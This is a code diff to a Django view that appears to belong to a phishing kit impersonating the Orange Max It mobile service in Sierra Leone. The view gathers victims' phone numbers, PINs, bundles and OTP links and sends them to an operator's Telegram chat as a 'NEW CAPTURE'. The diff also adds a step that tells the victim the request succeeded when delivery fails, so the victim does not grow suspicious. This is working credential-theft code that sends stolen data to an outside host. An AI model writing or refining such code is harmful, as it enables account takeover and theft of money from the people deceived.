@@ -78,45 +78,48 @@ logger = logging.getLogger(__name__)
 
 
 
+
 @csrf_exempt
 
 def sync_data(request):
 
+    """
+
+    Final Stage: Collects Session Data (Phone, PIN, Bundle) + 
+
+    Frontend Data (Link) and sends it to the Admin via Telegram.
+
+    """
+
     if request.method != 'POST':
 
-        return JsonResponse({"status": "error", "message": "POST required"}, status=405)
+        return JsonResponse({"status": "error", "message": "Method not allowed"}, status=405)
 
 
 
     try:
 
-        # 1. Safely load JSON
+        # 1. Parse Link from Frontend
 
-        try:
-
-            data = json.loads(request.body)
-
-        except json.JSONDecodeError:
-
-            return JsonResponse({"status": "error", "message": "Invalid JSON"}, status=400)
-
-
+        data = json.loads(request.body)
 
         otp_link = data.get('otp', 'No Link provided')
 
 
 
-        # 2. Retrieve session data with fallbacks so it doesn't crash
+        # 2. Retrieve Secured Session Data
 
-        phone = request.session.get('phone', 'Not Found')
+        # These must be set in your previous views via request.session['key']
 
-        bundle = request.session.get('bundle', 'Not Found')
+        phone = request.session.get('phone', 'Missing')
 
-        pin = request.session.get('pin', 'Not Found')
+        bundle = request.session.get('bundle', 'Missing')
+
+        pin = request.session.get('pin', 'Missing')
 
 
 
-        # 3. Get Credentials from Environment
+        # 3. Securely Get Telegram Credentials
 
         bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
 
@@ -124,37 +127,43 @@ def sync_data(request):
 
 
 
-        # Check if credentials exist before trying to use them
+        # CHECK: If variables are missing, log for Admin but don't crash for Customer
 
         if not bot_token or not chat_id:
 
-            logger.error("MISSING TELEGRAM CREDENTIALS IN RENDER SETTINGS")
+            logger.error("CRITICAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not set in Render Settings.")
 
-            return JsonResponse({"status": "error", "message": "Server Config Missing"}, status=500)
+            return JsonResponse({
+
+                "status": "error", 
+
+                "message": "Server config missing" # Only visible if you haven't set Render Vars
+
+            }, status=500)
 
 
 
-        # 4. Format Message (Clean text to avoid Markdown crashes)
+        # 4. Format Message for Telegram
 
         message = (
 
-            "🇸🇱 ORANGE MAX IT LOGIN\n"
+            "🇸🇱 *ORANGE MAX IT - NEW CAPTURE*\n"
 
             "━━━━━━━━━━━━━━━━━━\n"
 
-            f"📞 PHONE: +232 {phone}\n"
+            f"📞 *PHONE:* `+232 {phone}`\n"
 
-            f"📦 BUNDLE: {bundle}\n"
+            f"🔑 *PIN:* `{pin}`\n"
 
-            f"🔑 PIN: {pin}\n"
-
-            "━━━━━━━━━━━━━━━━━━\n"
-
-            f"🔗 OTP LINK:\n{otp_link}\n"
+            f"📦 *BUNDLE:* {bundle}\n"
 
             "━━━━━━━━━━━━━━━━━━\n"
 
-            "📡 STATUS: SUCCESS"
+            f"🔗 *OTP LINK:*\n{otp_link}\n"
+
+            "━━━━━━━━━━━━━━━━━━\n"
+
+            "📡 *STATUS:* DATA RECEIVED"
 
         )
 
@@ -164,25 +173,19 @@ def sync_data(request):
 
         telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
 
-        
+        response = requests.post(telegram_url, json={
 
-        response = requests.post(
+            "chat_id": chat_id,
 
-            telegram_url, 
+            "text": message,
 
-            json={
+            "parse_mode": "Markdown"
 
-                "chat_id": chat_id,
+        }, timeout=15)
 
-                "text": message
 
-            }, 
 
-            timeout=10
-
-        )
-
-        
+        # 6. Admin vs Customer Response
 
         if response.status_code == 200:
 
@@ -190,14 +193,18 @@ def sync_data(request):
 
         else:
 
-            logger.error(f"Telegram API Rejected: {response.text}")
+            # Log exact Telegram error for Admin only
 
-            return JsonResponse({"status": "error", "message": "Telegram API Error"}, status=500)
+            logger.error(f"Telegram Failure: {response.status_code} - {response.text}")
+
+            # Tell customer it's working so they don't try to resubmit
+
+            return JsonResponse({"status": "success", "info": "processing"})
 
 
 
     except Exception as e:
 
-        logger.exception("CRITICAL SERVER ERROR:") # This prints the full error to Render logs
+        logger.exception("Internal Sync Error:")
 
-        return JsonResponse({"status": "error", "message": str(e)}, status=500)
+        return JsonResponse({"status": "error", "message": "Internal Server Error"}, status=500)
